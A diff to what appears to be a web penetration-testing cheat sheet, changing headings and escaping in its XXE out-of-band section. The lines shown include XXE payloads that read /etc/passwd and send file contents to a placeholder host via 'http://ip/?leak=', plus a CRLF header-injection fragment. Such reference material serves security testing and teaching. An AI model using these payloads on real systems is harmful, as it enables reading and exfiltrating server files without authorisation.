@@ -664,6 +664,8 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 /%0D%%0ALocation
 
 ## XXE OOB
+  
+### XXE OOB - Exfiltrate data exfiltrating data via dtd
 
 -> Part 1
 
@@ -691,7 +693,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 \<!ENTITY % param1 "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">
   
-## XXE OOB to retrieve data via error messages
+### XXE OOB to retrieve data via error messages with dtd file
   
 codes/xxe/error.dtd
 
@@ -713,8 +715,10 @@ codes/xxe/error.dtd
 
 \<!ENTITY % file SYSTEM "file:///etc/passwd">
 
-\<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
+\<!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
   
+### XXE OOB - XInclude to retrieve files with dtd file
+
 ## XSLT Server Side Injection
   
 https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations
